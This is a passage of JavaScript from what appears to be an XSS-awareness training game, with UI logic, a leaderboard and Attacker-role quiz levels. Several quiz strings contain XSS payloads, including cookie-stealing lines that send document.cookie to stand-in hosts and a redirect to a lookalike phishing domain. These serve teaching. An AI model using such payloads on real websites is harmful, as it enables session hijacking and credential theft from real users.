        "\n Well done on mastering the Defender role flawlessly! \n Even with your strong grasp of XSS protection techniques, replaying the role can further strengthen your knowledge.",
        "\n You’ve aced the Defender role flawlessly — impressive work! \n Still, it’s beneficial to replay it and reinforce your skills in defending against XSS attacks.",
        "\n Excellent flawless performance in the Defender role! \n Although your XSS defence tactics are solid, practicing again can deepen your understanding of key concepts.",
        "\n You’ve flawlessly defended against XSS attacks! \n To truly cement your skills, it’s always helpful to replay the Defender role and review the lessons learned."
    ];

    levelUserFlawlessCompletionList = ["\n Congratulations, you have completed the User role flawlessly!!! \n While your newly acquired knowledge helps to navigate the digital landscape more safely, it is always good to replay the User role to reinforce the concepts learnt.",
        "\n Well done on completing the User role perfectly! \n Your awareness of safe web usage has grown, but replaying the role can help reinforce your understanding.",
        "\n Great job mastering the User role flawlessly! \n Even though you’ve gained valuable knowledge to stay safer online, reviewing the role again can strengthen those concepts.",
        "\n You’ve successfully completed the User role flawlessly — impressive! \n To ensure you retain your knowledge and stay protected online, it’s a good idea to replay the role.",
        "\n Excellent work in completing the User role flawlessly! \n Your new insights into secure web behavior are important, and revisiting the role will help solidify them further.",
        "\n You’ve flawlessly navigated the User role with excellence! \nWhile your safety skills have improved, repeating the experience can further embed those key lessons."

    ];

    attackerRefOffset = 9.09;
    attackerStoredOffset = 14.2;
    attackerDOMOffset = 12.5;

    defenderRefOffset = 16.6;
    defenderStoredOffset = 16.6;
    defenderDOMOffset = 10;

    userRefOffset = 12.5;
    userStoredOffset = 12.5;
    userDOMOffset = 12.5;

    overallRefOffset = 4;
    overallStoredOffset = 4.75;
    overallDOMOffset = 3.81;


    attackerSimZoneOffset = 7.69;
    defenderSimZoneOffset = 12.5;
    userSimZoneOffset = 25;
    overallSimZoneOffset = 4;

    function main() {
        
        gameStatus = "GameSessionStarted!";
        $('div#mainUI').show();
        setTimeout(showGDPRPopUp, 3000);

    }
    main();
});

function showGDPRPopUp() {
    if (infoPopUp == false && gameStatusPP == false) {
        $('div#gdprPopup1').show();
    }
}

function closeGDPRInfo() {
    gameStatusPP = true;
    $('div#gdprPopup1').hide();

}

function showNoServerConnectivityInfoPopUp() {
    playButtonErrorMusic();
    $('div#noServerConnectivityInfoPopUp1').show();
}

function closeNoServerConnectivityInfoPopUp() {
    $('div#noServerConnectivityInfoPopUp1').hide();
}

function playButtonHoverMusic() {

    if (playMusic == true) {
        document.getElementById('buttonHoverSound').play();
    }
}

function playButtonSelectMusic() {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
}

function playButtonErrorMusic() {

    if (playMusic == true) {
        document.getElementById('buttonErrorSound').play();
    }
}

function stopStartMenuMusic() {
    playMusic = false;
    document.getElementById('startMenuMusic').pause();
    const mute_music_btns = document.getElementsByClassName('mutemusicbtn');
    const play_music_btns = document.getElementsByClassName('playmusicbtn');

    for (let i = 0; i < mute_music_btns.length; i++) {
        mute_music_btns[i].style.visibility = "visible";
        play_music_btns[i].style.visibility = "hidden";
    }
}

function playStartMenuMusic() {
    playMusic = true;
    document.getElementById('startMenuMusic').play();
    const mute_music_btns = document.getElementsByClassName('mutemusicbtn');
    const play_music_btns = document.getElementsByClassName('playmusicbtn');

    for (let i = 0; i < mute_music_btns.length; i++) {
        mute_music_btns[i].style.visibility = "hidden";
        play_music_btns[i].style.visibility = "visible";
    }
}

function displayInfo() {
    $('div#infoPopUp1').show();
    infoPopUp = true;
}

function closeDisplayInfo() {
    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#infoPopUp1').hide();
    infoPopUp = false;
}




function closePlayerNameErrorInfo() {
    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#emptyPlayerNameErrorPopUp1').hide();
}



function closePlayerRoleErrorInfo() {
    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#emptyPlayerRoleErrorPopUp1').hide();
}



function closeInvalidPlayerNameErrorInfo() {
    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#playerNameErrorPopUp1').hide();
}

function closeinteractivityInfoPopUp() {
    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#interactivityInfoPopUp1').hide();
    interactivityInfoPopUp == true;
}

function showinteractivityInfoPopUp() {
    if (interactivityInfoPopUp == false) {
        if (playMusic == true) {
            document.getElementById('buttonSelectSound').play();
        }
        $('div#interactivityInfoPopUp1').show();
    }
}


function startLevelTimer() {

    timerInterval = setInterval(startTimer, 1000);

}

function showSelectPlayerNameUI() {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    if (gameStatusPP == true) {
        $('div#mainUI').hide();
        $('div#pageFooter').hide();
        $('div#selectPlayerNameUI').show();
        $('div#selectPlayerRoleUI').hide();
        $('div#levelUI').hide();
        $('div#preGameQuestionnaireUI').hide();
        $('div#postGameQuestionnaireUI').hide();
        $('div#leaderboardUI').hide();
        $('div#exitGameUI').hide();
    } else if (gameStatusPP == false) {
        $('div#gdprPopup1').show();
    }


}


function showLeaderBoard() {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#mainUI').hide();
    $('div#pageFooter').hide();
    $('div#selectPlayerNameUI').hide();
    $('div#selectPlayerRoleUI').hide();
    $('div#levelUI').hide();
    $('div#preGameQuestionnaireUI').hide();
    $('div#postGameQuestionnaireUI').hide();
    $('div#leaderboardUI').show();
    $('div#exitGameUI').hide();


    const players = getAllPlayersData();

    let table = '<table>';
    table += '<tr><th style="color: rgb(255, 255, 255);font-weight: bold;text-align: center;">Playername</th><th style="color: rgb(255, 255, 255);font-weight: bold;text-align: center;">Player Avatar</th><th style="color: rgb(255, 255, 255);font-weight: bold;text-align: center;">Points</th><th style="color: rgb(255, 255, 255);font-weight: bold;text-align: center;">Badges</th></tr>';

    players.forEach(player => {
        let avatarImage = `<img class="avatar-image-cell" src="images/avatars/avatar${player.avatarId}.png">`;

        let badgeImages = "";
        const roles = player.playerRolesPlayed || [];
        if (roles.includes("Attacker")) badgeImages += '<img class="badge-attacker-cell" src="images/badges/Attacker-Completed.png">';
        if (roles.includes("Defender")) badgeImages += '<img class="badge-defender-cell" src="images/badges/Defender-Completed.png">';
        if (roles.includes("User")) badgeImages += '<img class="badge-user-cell" src="images/badges/User-Completed.png">';
        if (roles.includes("SimZone")) badgeImages += '<img class="badge-SimZone-cell" src="images/badges/Sim-Zone.png">';

        table += `<tr><td>${player.playerName}</td><td>${avatarImage}</td><td>${player.playerScore}</td><td>${badgeImages}</td></tr>`;
    });

    table += '</table>';
    document.getElementById('table-container').innerHTML = table;

}

function showMainMenu() {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }

    $('div#mainUI').show();
    $('div#pageFooter').show();
    $('div#selectPlayerNameUI').hide();
    $('div#selectPlayerRoleUI').hide();
    $('div#levelUI').hide();
    $('div#preGameQuestionnaireUI').hide();
    $('div#postGameQuestionnaireUI').hide();
    $('div#leaderboardUI').hide();
    $('div#exitGameUI').hide();

}

function showPreGameQuestionnaireUI() {

    let regex = /^[a-z0-9@._+-]+$/i;

    playerName = document.getElementById("playerNameBox").value;
    playerName = DOMPurify.sanitize(playerName);


    if (playerName == "" || avatarId == 100) {
        if (playMusic == true) {
            document.getElementById('buttonErrorSound').play();
        }
        $('div#emptyPlayerNameErrorPopUp1').show();
    } else if (!regex.test(playerName) || playerName.length > 15) {
        if (playMusic == true) {
            document.getElementById('buttonErrorSound').play();
        }
        $('div#playerNameErrorPopUp1').show();
    } else {
        $('div#mainUI').hide();
        $('div#pageFooter').hide();
        $('div#selectPlayerNameUI').hide();
        $('div#selectPlayerRoleUI').hide();
        $('div#preGameQuestionnaireUI').show();
        $('div#levelUI').hide();
        $('div#postGameQuestionnaireUI').hide();
        $('div#leaderboardUI').hide();
        $('div#exitGameUI').hide();
    }

}

function showPostGameQuestionnaireUI() {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    $('div#mainUI').hide();
    $('div#pageFooter').hide();
    $('div#selectPlayerNameUI').hide();
    $('div#selectPlayerRoleUI').hide();
    $('div#preGameQuestionnaireUI').hide();
    $('div#levelUI').hide();
    $('div#postGameQuestionnaireUI').show();
    $('div#leaderboardUI').hide();
    $('div#exitGameUI').hide();


    
    const safePlayerName = DOMPurify.sanitize(playerName);
    const safeAvatarId = DOMPurify.sanitize(avatarId);

    
    const safePlayerScore = parseInt(DOMPurify.sanitize(document.getElementById('playerScoreInGame').innerText), 10) || 0;
    const safePlayerRolesPlayed = DOMPurify.sanitize(playerRolesPlayed)

    const playerData = {
        playerName: safePlayerName, 
        avatarId: safeAvatarId,
        playerScore: parseInt(safePlayerScore, 10),
        playerRolesPlayed: safePlayerRolesPlayed 
    };

    const sessionKey = playerName + "_" + new Date().getTime(); 
    localStorage.setItem(sessionKey, JSON.stringify(playerData));


}


function htmlEncode(input) {
    return input
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/\'/g, '&#x27;')
        .replace(/`/g, '&#x60;');
}

function getAllPlayersData() {
    const players = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try {
            const playerData = JSON.parse(localStorage.getItem(key));
            if (playerData && playerData.playerName) { 
                players.push(playerData);
            }
        } catch (e) {
            
            continue;
        }
    }

    players.sort((a, b) => b.playerScore - a.playerScore);
    return players;
}


function showExitGameUI() {


    document.getElementById("endSessionPlayerConfirmation").innerHTML = playerName;
    $('div#mainUI').hide();
    $('div#pageFooter').hide();
    $('div#selectPlayerNameUI').hide();
    $('div#selectPlayerRoleUI').hide();
    $('div#preGameQuestionnaireUI').hide();
    $('div#levelUI').hide();
    $('div#postGameQuestionnaireUI').hide();
    $('div#leaderboardUI').hide();
    $('div#exitGameUI').show();
}


function selectPlayerAvatar(iD) {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    prevAvatarId = avatarId;
    avatarId = iD;


    const playerAvatars = document.getElementsByClassName('playerAvatars');

    switch (avatarId) {
        case 0:

            document.getElementById("avatar0").setAttribute("style", "border:0.4vw solid #0df27e;border-radius: 1vw;");


            break;
        case 1:

            document.getElementById("avatar1").setAttribute("style", "border:0.4vw solid #0df27e;border-radius: 1vw;");


            break;
        case 2:

            document.getElementById("avatar2").setAttribute("style", "border:0.4vw solid #0df27e;border-radius: 1vw;");


            break;
        case 3:

            document.getElementById("avatar3").setAttribute("style", "border:0.4vw solid #0df27e;border-radius: 1vw;");


            break;
        case 4:

            document.getElementById("avatar4").setAttribute("style", "border:0.4vw solid #0df27e;border-radius: 1vw;");


            break;
        case 5:


            document.getElementById("avatar5").setAttribute("style", "border:0.4vw solid #0df27e;border-radius: 1vw;");



            break;

    }

    if (prevAvatarId != avatarId) {
        playerAvatars[prevAvatarId].setAttribute("style", "border:0.4vw solid #000000;border-radius: 1vw;");
    }
}



function showSelectPlayerRoleUI() {


    $('div#mainUI').hide();
    $('div#pageFooter').hide();
    $('div#selectPlayerNameUI').hide();
    $('div#selectPlayerRoleUI').show();
    $('div#preGameQuestionnaireUI').hide();
    $('div#levelUI').hide();
    $('div#postGameQuestionnaireUI').hide();
    $('div#leaderboardUI').hide();
    $('div#exitGameUI').hide();

}


function selectPlayerRole(iD) {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    prevRoleId = roleId;
    roleId = iD;


    const playerRoleAvatars = document.getElementsByClassName('playerRoleAvatars');

    switch (roleId) {
        case 0:

            document.getElementById("playerRoleavatar0").setAttribute("style", "border:8px solid #0df27e;border-radius: 25px;");
            showLevel();

            break;
        case 1:

            document.getElementById("playerRoleavatar1").setAttribute("style", "border:8px solid #0df27e;border-radius: 25px;");
            showLevel();


            break;
        case 2:

            document.getElementById("playerRoleavatar2").setAttribute("style", "border:8px solid #0df27e;border-radius: 25px;");
            showLevel();


            break;


    }

    if (prevRoleId != roleId)

        playerRoleAvatars[prevRoleId].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");

}


function showLevel() {


    const playerNameInGameClass = document.getElementsByClassName('playerNameInGame');
    const playerAvatarInGameClass = document.getElementsByClassName('playerAvatarInGame');

    const questionAnswerTiles = document.getElementsByClassName('questionTile');




    playerNameInGameClass[0].innerText = playerName;
    if (avatarId == 0) {
        playerAvatarInGameClass[0].src = "images/avatars/avatar0.png";
    } else if (avatarId == 1) {
        playerAvatarInGameClass[0].src = "images/avatars/avatar1.png";
    } else if (avatarId == 2) {
        playerAvatarInGameClass[0].src = "images/avatars/avatar2.png";
    } else if (avatarId == 3) {
        playerAvatarInGameClass[0].src = "images/avatars/avatar3.png";
    } else if (avatarId == 4) {
        playerAvatarInGameClass[0].src = "images/avatars/avatar4.png";
    } else if (avatarId == 5) {
        playerAvatarInGameClass[0].src = "images/avatars/avatar5.png";
    }




    if (roleId == 100) {
        if (playMusic == true) {
            document.getElementById('buttonErrorSound').play();
        }
        $('div#emptyPlayerRoleErrorPopUp1').show();
    } else if (roleId == 0) {

        if (playMusic == true) {
            document.getElementById('buttonSelectSound').play();
        }
        $('div#mainUI').hide();
        $('div#pageFooter').hide();
        $('div#selectPlayerNameUI').hide();
        $('div#selectPlayerRoleUI').hide();
        $('div#preGameQuestionnaireUI').hide();
        $('div#levelUI').show();
        $('div#postGameQuestionnaireUI').hide();
        $('div#leaderboardUI').hide();
        $('div#exitGameUI').hide();


        if (currentLevelNo == 1 || currentLevelNo == 200) {


            if (!initialTimerStarted) {

                initialTimerStarted = true;
                setTimeout(startLevelTimer, 10000);
            }


            $('#level1gif').fadeIn(0);
            document.getElementById('level1gif').style.visibility = "visible";
            $('#level1gif').fadeOut(4000);

            if (rolesPlayed.length == 0) {
                setTimeout(showinteractivityInfoPopUp, 5000);
            }

            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }
            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));
            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L1-1.png";
            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const questionInteractivityButtonVariable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.5vw;font-weight: bold;position:fixed;top:50%;left:2%;width: 70%;height: 20%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.5vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 70%;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:10%;width:70%;height:50%;z-index: 0;visibility: visible;");
            questionInteractivityButtonVariable.setAttribute("style", "top:15%;left:46%;height: 8%;width: 4%;visibility: visible;");


            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionTextContainer").innerHTML = "Imagine a popular e-commerce platform that allows users to buy different items online. The developers have hired you as an “ethical hacker” to find system security vulnerabilities. The website has a search function which displays the search string in the URL, like this: <br> <span style='color:red;background-color:black;'>https://myshopping.com?search=iPad</span>    <br>What could be your steps to test the XSS  security vulnerabilities of the system?";

            document.getElementById("questionTileText1").innerText = "Running a search string to see the available products";
            document.getElementById("questionTileText2").innerText = "Identifying that this setup can be used for reflected XSS attacks";
            document.getElementById("questionTileText3").innerText = "Identifying that this setup can be used for stored XSS attacks";
            document.getElementById("questionTileText4").innerText = "Submit a test script like <script>alert(‘test’);</script> to the search to see if JavaScript (JS) can be executed on the webpage";
            document.getElementById("questionTextContainer1").style.visibility = "hidden";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 2) {

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));
            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L1-2.png";
            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const questionInteractivityButtonVariable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.3vw;font-weight: bold;position:fixed;top:50%;left:3%;width: 70%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:65%;left:5%;font-weight: bold;background-color: #000000;width: 70%;visibility: visible;z-index: 0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:5%;left:10%;width:70%;height:50%;z-index: 0;visibility: visible;");
            questionInteractivityButtonVariable.setAttribute("style", "top:16%;left:46%;height: 8%;width: 4%;visibility: visible;");

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "In the last steps, it was discovered that the e-commerce webpage is vulnerable to JS injection. As an ethical hacker, you create a new impersonation website which looks like the original e-commerce website which also has a very similar URL <span style='color:red;background-color:black;'>(http://myshoping.com)</span>. Moreover, you add a JS to the original website link which redirects anyone who clicks the link to the impersonation website. You can now send this link to numerous users to see if they click it. <br> <br> <br>What XSS attacks could be done using this link and impersonation website? ";
            document.getElementById("questionTextContainer1").innerText = "https://myshopping.com?search=<script>window.location.replace('http://myshoping.com');</script>";

            document.getElementById("questionTileText1").innerText = "Run a phishing campaign to trick users to submit credentials to the impersonation website";
            document.getElementById("questionTileText2").innerText = "Use browser vulnerabilities to silently install and run malware";
            document.getElementById("questionTileText3").innerText = "Run a phishing campaign to trick users to submit credit card information to the impersonation website";
            document.getElementById("questionTileText4").innerText = "Hack into the Wi-Fi network of the user";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 3) {

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));
            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 55%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.5vw;position:fixed;top:30%;left:15%;font-weight: bold;background-color: #000000;width: 55%;line-height: normal;visibility: visible;z-index: 0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:36%;left:65%;height: 8%;width: 4%;z-index: 1;");
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            document.getElementById("questionImageContainer").style.visibility = "hidden";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 3";
            document.getElementById("questionTextContainer").innerHTML = "In the last steps, it was discovered that the e-commerce webpage is vulnerable to JS injection. Moreover, it was further discovered that the following scripts can also be executed in the webpage,<br><br><br><br><br><br>Assuming you can send the URLs with these malicious scripts to potential users, what potentially harmful XSS attacks could be carried out? ";
            document.getElementById("questionTextContainer1").innerText = "<img src=x onerror=this.src= http://www.maliciouswebsite/?c='+document.cookie> \n\n <script>window.location.replace('http://www.maliciouswebsite.com'); </script>";

            document.getElementById("questionTileText1").innerText = "Stealing the HTTP cookies of the website";
            document.getElementById("questionTileText2").innerText = "Redirecting users to other potentially malicious websites";
            document.getElementById("questionTileText3").innerText = "Use malware to access the user’s microphone and webcam";
            document.getElementById("questionTileText4").innerText = "Impersonate the user in active sessions";


            calculateTileOrder();
            reorderQuestionTiles();
        } else if (currentLevelNo == 4) {

            $('#level2gif').fadeIn(0);
            document.getElementById('level2gif').style.visibility = "visible";
            $('#level2gif').fadeOut(4000);


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }

            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L2-1.png";
            document.getElementById("questionImageContainer").style.visibility = "visible";
            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:54%;left:4%;width: 70%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 1550px;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:3%;left:10%;height:60%;width:70%;z-index: 0;visibility: visible;");
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:28%;left:45%;z-index: 1;height: 8%;width: 4%;");
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionTextContainer").innerHTML = "Imagine a popular e-commerce platform that allows users to submit comments on their shopping experience. The developers have hired you as an “ethical hacker” to find system vulnerabilities.<br> What could be your steps to test the XSS vulnerabilities of the system?";

            document.getElementById("questionTextContainer1").style.visibility = "hidden";


            document.getElementById("questionTileText1").innerText = "Submitting your email and a text comment to the form";
            document.getElementById("questionTileText2").innerText = "Identifying that this setup can be used for reflected XSS attacks";
            document.getElementById("questionTileText3").innerText = "Identifying that this setup can be used for stored XSS attacks";
            document.getElementById("questionTileText4").innerText = "Submit a test script like <script>alert(‘test’);</script> to the comments to see if JavaScript (JS) can be executed on the webpage";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 5) {

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));
            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:8%;left:15%;width: 57%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.7vw;position:fixed;top:30%;left:15%;font-weight: bold;background-color: #000000;width: 57%;line-height: normal;visibility: visible;z-index: 0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");
            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:24%;left:65%;z-index: 1;height: 8%;width: 4%;");
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            document.getElementById("questionImageContainer").style.visibility = "hidden";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 2";
            document.getElementById("questionTextContainer").innerHTML = "In the last steps, it was discovered that the e-commerce webpage is vulnerable to JS injection. As an ethical hacker you submit the following scripts into the comment page.  <br> <br> <br> <br> <br> <br> <br> You also create another website <span style='color:red;background-color:black;'>(http://maliciouswebsite.com)</span> to capture user data from visitors to the e-commerce website. <br> <br>What harmful XSS attacks could potentially be carried out?";

            document.getElementById("questionTextContainer1").innerText = "<script>document.write('<img src='http://malicious-site.com/steal?cookie=' + document.cookie + ' />');</script> \n \n<script>window.location.replace('http://maliciouswebsite.com');</script>";


            document.getElementById("questionTileText1").innerText = "Stealing the HTTP cookies of the website";
            document.getElementById("questionTileText2").innerText = "Redirecting users to other potentially malicious websites";
            document.getElementById("questionTileText3").innerText = "Use malware to access the user’s microphone and webcam";
            document.getElementById("questionTileText4").innerText = "Gaining direct access to the e-commerce website’s internal database";


            calculateTileOrder();
            reorderQuestionTiles();
        } else if (currentLevelNo == 6) {

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }



            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 2vw;font-weight: bold;position:fixed;top:10%;left:15%;width: 55%;word-wrap: break-word;line-height: normal;z-index: 0;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.25vw;position:fixed;top:10%;left:15%;font-weight: bold;background-color: #000000;width: 60%;visibility: visible;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:4%;left:15%;transform: scale(0.75, 0.75);z-index: 0;visibility: visible;");
            document.getElementById("questionTextContainer1").style.visibility = "hidden";
            document.getElementById("questionImageContainer").style.visibility = "hidden";
            document.getElementById("InteractivityButton1").style.visibility = "hidden";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 3";
            document.getElementById("questionTextContainer").innerHTML = "In the last steps, it was discovered that the e-commerce webpage is vulnerable to JS injection. Moreover, it was further discovered that the e-commerce website is vulnerable to both reflected and stored XSS attacks. <br><br> <br> Which of the following statements are true?";



            document.getElementById("questionTileText1").innerText = "Reflected XSS attacks need users to click a potentially harmful URL";
            document.getElementById("questionTileText2").innerText = "Stored XSS attacks essentially need users to click a potentially harmful URL";
            document.getElementById("questionTileText3").innerText = "In stored XSS attacks, attackers submit and store a harmful script that gets run by subsequent visitors to the webpage";
            document.getElementById("questionTileText4").innerText = "HTTPS can be used to prevent XSS attacks";


            calculateTileOrder();
            reorderQuestionTiles();

        } else if (currentLevelNo == 7) {

            $('#level3gif').fadeIn(0);
            document.getElementById('level3gif').style.visibility = "visible";
            $('#level3gif').fadeOut(4000);

            for (let i = 0; i < questionAnswerTiles.length; i++) {
                questionAnswerTiles[i].setAttribute("style", "border:5px solid rgb(255, 255, 255);border-radius: 25px;");
            }


            questionTile1Selected = false;
            questionTile2Selected = false;
            questionTile3Selected = false;
            questionTile4Selected = false;

            fm.setPercentage(0 + ((levelsCompleted.length + 1) * levelMultiplier));

            const questionTextContainerVariable = document.getElementById("questionTextContainer");
            const questionTextContainer1Variable = document.getElementById("questionTextContainer1");
            const questionImageContainerVariable = document.getElementById("questionImageContainer");
            const InteractivityButton1Variable = document.getElementById("InteractivityButton1");

            questionTextContainerVariable.setAttribute("style", "color: rgb(255, 255, 255);font-family: 'Calibri', serif; font-size: 1.3vw;font-weight: bold;position:fixed;top:45%;left:1%;width: 73%;word-wrap: break-word;line-height: normal;z-index: -1;visibility: visible;");
            questionTextContainer1Variable.setAttribute("style", "color: rgb(255, 0, 0);font-size: 1.2vw;position:fixed;top:63%;left:3%;font-weight: bold;background-color: #000000;width: 70%;visibility: visible;z-index:0;");
            questionImageContainerVariable.setAttribute("style", "position:fixed;top:-1%;left:13%;height:55%;width:55%;z-index: 0;visibility: visible;");
            document.getElementById("questionTextContainer1").style.visibility = "visible";
            document.getElementById("questionImageContainer").style.visibility = "visible";
            document.getElementById("InteractivityButton1").style.visibility = "visible";

            InteractivityButton1Variable.setAttribute("style", "position:fixed;top:13%;left:40%;z-index: 1;height: 8%;width: 4%;");


            document.getElementById("questionImageContainer").src = "images/levels/Attacker-L3-1.png";

            document.getElementById("questionHeadingContainer").innerHTML = "Question 1";
            document.getElementById("questionHeadingContainer").style.top = "-3%";
            document.getElementById("questionTextContainer").innerHTML = "A popular e-commerce website has an image tab that dynamically updates the webpage using JavaScript. In this case, the URL fragment (the part after #, which isn’t sent to the server) acts as input for a client-side script, directing the browser on which tab to show. <span style='color:red;background-color:black;'>(https://myshopping.com/store#Paris) </span> <br> You analyze the website's JavaScript and find the following vulnerable code:<br><br><br><br><br>What XSS security vulnerabilities exist in this implementation?";
